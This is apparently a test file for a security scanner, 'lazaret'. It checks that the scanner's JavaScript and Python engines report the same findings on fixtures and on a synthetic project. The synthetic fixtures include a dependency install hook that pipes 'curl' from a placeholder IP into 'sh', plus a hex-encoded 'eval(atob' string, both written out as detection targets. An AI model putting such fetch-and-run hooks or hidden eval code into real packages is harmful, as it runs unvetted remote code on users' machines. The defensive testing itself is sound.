"""The JavaScript engine (js/) and the Python engine must report the same
findings for the same input. Runs both CLIs on every fixture tree and on a
synthetic project covering the false-positive fixes, and compares
(rule, file, line) sets and exit codes. Skipped where Node isn't installed.

Known, deliberate differences are listed in PYTHON_ONLY: features that exist
only in the Python engine. Any other difference fails this test, so the two
engines can't drift apart silently.
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

from tests import _support

NODE = shutil.which("node")
JS_BIN = os.path.join(_support.REPO_ROOT, "js", "bin", "lazaret.js")

# fixture -> rules only the Python engine implements
PYTHON_ONLY = {
    "cfgproj": {"T-CMD"},    # custom taint spec (lazaret-taint.json): Python-only
    "flowproj": {"X-SQL"},   # cross-file taint (lazaret.scanner.flow): Python-only
}

SYNTHETIC = {
    "lib/encoding.py": (
        "BOM = b'\\xff\\xfe{\\x00\"\\x00K0\"\\x00=\\x00\"\\x00\\xab0\"\\x00\\r\\n'\n"
        "SOCKS = b'\\x00\\x00\\x01\\x7f\\x00\\x00\\x01\\xea\\x60'\n"
        "PUNCT = '\\x21\\x24\\x2a\\x2d\\x3a\\x3d\\x3f\\x5b\\x5d'\n"
        "HIDDEN = '\\x65\\x76\\x61\\x6c\\x28\\x61\\x74\\x6f\\x62'\n"),
    "lib/ssh.py": '_PEM_BEGIN = b"-----BEGIN OPENSSH PRIVATE KEY-----"\n',
    "package.json": json.dumps({"name": "app", "scripts": {
        "prepare": "node build.js", "prepack": "node pack.js",
        "postinstall": "node -e \"try{require('./postinstall')}catch(e){}\""}}, indent=2),
    "postinstall.js": "console.log('thanks');\n",
    "node_modules/evil-pkg/package.json": json.dumps({"name": "evil-pkg", "scripts": {
        "prepare": "node x.js", "postinstall": "curl -s http://192.0.2.1/x | sh"}}, indent=2),
}


def findings(cmd, root):
    with tempfile.TemporaryDirectory() as out:
        p = subprocess.run(cmd + ["--out-dir", out, "--no-html", "--quiet"], capture_output=True,
                           encoding="utf-8", errors="replace", timeout=120)
        path = os.path.join(out, "lazaret-report.json")
        report = json.load(open(path, encoding="utf-8")) if os.path.exists(path) else {"issues": []}

    def rel(f):
        return os.path.relpath(f, root) if os.path.isabs(f) else f
    return p.returncode, {(i["rule"], rel(i["file"]).replace(os.sep, "/"), i["line"]) for i in report["issues"]}


def both(root, deps=False):
    js = findings([NODE, JS_BIN, "check", root] + (["--include-deps"] if deps else []), root)
    py = findings([sys.executable, "-m", "lazaret", root] + (["--deps"] if deps else []), root)
    return js, py


@unittest.skipUnless(NODE, "node is not installed")
class EngineParityTests(unittest.TestCase):
    def test_fixture_trees(self):
        for name in sorted(os.listdir(_support.FIXTURES)):
            root = os.path.join(_support.FIXTURES, name)
            if not os.path.isdir(root):
                continue
            with self.subTest(fixture=name):
                (js_exit, js), (py_exit, py) = both(root)
                self.assertEqual(sorted(js - py), [], "findings only the JS engine reports")
                self.assertEqual({rule for rule, _, _ in py - js}, PYTHON_ONLY.get(name, set()),
                                 "findings only the Python engine reports")
                if name not in PYTHON_ONLY:
                    self.assertEqual(js_exit, py_exit)

    def test_windows_line_endings_change_nothing(self):
        """Every fixture, converted to CRLF (as a Windows checkout does), must
        give exactly the findings its LF original gives, in both engines. CI
        on Windows first caught this: a bare "# nosec" on a CRLF line was
        ignored by the JS engine."""
        for name in sorted(os.listdir(_support.FIXTURES)):
            src = os.path.join(_support.FIXTURES, name)
            if not os.path.isdir(src):
                continue
            with self.subTest(fixture=name), tempfile.TemporaryDirectory() as tmp:
                lf, crlf = os.path.join(tmp, "lf"), os.path.join(tmp, "crlf")
                shutil.copytree(src, lf)
                shutil.copytree(src, crlf)
                for dirpath, _, files in os.walk(crlf):
                    for fname in files:
                        if fname.endswith((".py", ".js", ".sql", ".json")):
                            path = os.path.join(dirpath, fname)
                            with open(path, "rb") as f:
                                data = f.read().replace(b"\r\n", b"\n")
                            with open(path, "wb") as f:
                                f.write(data.replace(b"\n", b"\r\n"))
                (js_lf_exit, js_lf), (py_lf_exit, py_lf) = both(lf)
                (js_cr_exit, js_cr), (py_cr_exit, py_cr) = both(crlf)
                self.assertEqual(js_cr, js_lf, "JS engine: CRLF changed the findings")
                self.assertEqual(py_cr, py_lf, "Python engine: CRLF changed the findings")
                self.assertEqual((js_cr_exit, py_cr_exit), (js_lf_exit, py_lf_exit))

    def test_false_positive_fixes_agree(self):
        with tempfile.TemporaryDirectory() as root:
            for rel, content in SYNTHETIC.items():
                path = os.path.join(root, rel)
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "w", encoding="utf-8") as f:
                    f.write(content)
            (js_exit, js), (py_exit, py) = both(root, deps=True)
            self.assertEqual(js, py)
            self.assertEqual(js_exit, py_exit)
            # and what both report is right, not merely identical:
            hex_lines = sorted(line for rule, f, line in js if rule == "SC-HEXSTR")
            self.assertEqual(hex_lines, [4], "only the hidden 'eval(atob' line")
            self.assertFalse(any(rule == "S-TOKEN" for rule, _, _ in js), "PEM header constant")
            hooks = {(f, line) for rule, f, line in js if rule == "SC-INSTALL-HOOK"}
            manifest = SYNTHETIC["package.json"].split("\n")
            dep = SYNTHETIC["node_modules/evil-pkg/package.json"].split("\n")
            self.assertEqual(hooks, {
                ("package.json", 1 + next(i for i, l in enumerate(manifest) if '"prepare"' in l)),
                ("package.json", 1 + next(i for i, l in enumerate(manifest) if '"postinstall"' in l)),
                ("node_modules/evil-pkg/package.json", 1 + next(i for i, l in enumerate(dep) if '"postinstall"' in l)),
            }, "prepare counts in the project but not in a dependency; prepack never")


if __name__ == "__main__":
    unittest.main()
